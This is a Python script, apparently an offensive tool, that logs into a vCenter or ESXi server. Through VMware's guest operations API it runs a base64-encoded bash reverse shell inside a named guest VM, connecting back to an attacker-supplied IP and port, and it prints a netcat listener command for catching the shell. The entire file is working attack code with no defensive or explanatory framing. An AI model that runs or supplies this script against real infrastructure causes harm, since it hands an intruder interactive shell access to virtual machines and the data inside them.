#!/usr/bin/env python3

import argparse
import base64
import ssl
from typing import Iterable, Optional

from pyVim.connect import Disconnect, SmartConnect
from pyVmomi import vim


def build_ssl_context(skip_verify: bool) -> ssl.SSLContext:
    if skip_verify:
        return ssl._create_unverified_context()
    context = ssl.create_default_context()
    context.check_hostname = True
    return context


def get_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Execute reverse shell in a guest VM via vCenter",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-H", "--host", required=True, help="vCenter/ESXi host")
    parser.add_argument("-u", "--user", required=True, help="vCenter username")
    parser.add_argument("-p", "--password", help="vCenter password (prompt if omitted)")
    parser.add_argument("--port", type=int, default=443, help="API port")
    parser.add_argument("-vm", "--vm-name", required=True, help="Target virtual machine name")
    parser.add_argument("-l", "--lhost", required=True, help="Attacker IP (your listener)")
    parser.add_argument("-P", "--lport", required=True, type=int, help="Attacker port")
    parser.add_argument("-gu", "--guest-user", required=True, help="Guest OS username")
    parser.add_argument("-gp", "--guest-pass", help="Guest OS password (prompt if omitted)")
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="Skip SSL verification (use for self-signed certs)",
    )
    return parser.parse_args()


def connect_vsphere(host: str, user: str, password: str, port: int, insecure: bool) -> vim.ServiceInstance:
    context = build_ssl_context(skip_verify=insecure)
    return SmartConnect(host=host, user=user, pwd=password, port=port, sslContext=context)


def find_vm_by_name(content, name: str) -> Optional[vim.VirtualMachine]:
    view = content.viewManager.CreateContainerView(content.rootFolder, [vim.VirtualMachine], True)
    try:
        for vm in view.view:
            if vm.name == name:
                return vm
    finally:
        view.Destroy()
    return None


def build_reverse_shell(lhost: str, lport: int) -> str:
    reverse_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    encoded = base64.b64encode(reverse_shell.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"


def ensure_vm_ready(vm: vim.VirtualMachine) -> Optional[str]:
    if vm.runtime.powerState != vim.VirtualMachinePowerState.poweredOn:
        return "VM is not powered on"
    guest = getattr(vm, "guest", None)
    if not guest or guest.toolsRunningStatus != "guestToolsRunning":
        return "VMware Tools is not running in guest"
    return None


def main() -> None:
    args = get_args()

    import getpass

    vcenter_pass = args.password or getpass.getpass("vCenter Password: ")
    guest_pass = args.guest_pass or getpass.getpass("Guest OS Password: ")

    command = build_reverse_shell(args.lhost, args.lport)

    si = None
    try:
        print(f"Connecting to {args.host}:{args.port} (verify_ssl={'no' if args.insecure else 'yes'})...")
        si = connect_vsphere(args.host, args.user, vcenter_pass, args.port, args.insecure)
        content = si.RetrieveContent()

        vm = find_vm_by_name(content, args.vm_name)
        if not vm:
            print(f"Error: VM '{args.vm_name}' not found")
            return

        ready_error = ensure_vm_ready(vm)
        if ready_error:
            print(f"Error: {ready_error}")
            return

        creds = vim.vm.guest.NamePasswordAuthentication(username=args.guest_user, password=guest_pass)
        pm = content.guestOperationsManager.processManager
        spec = vim.vm.guest.ProcessManager.ProgramSpec(programPath="/bin/bash", arguments=f"-c \"{command}\"")

        pid = pm.StartProgramInGuest(vm, creds, spec)
        print(f"[+] Reverse shell executed on '{args.vm_name}' (PID: {pid})")
        print(f"[+] Check your listener: nc -lvnp {args.lport}")
        print("Disconnected successfully.")
    except Exception as exc:  # pragma: no cover - pyvmomi specific paths
        print(f"Error: {exc}")
    finally:
        if si:
            Disconnect(si)


if __name__ == "__main__":
    main()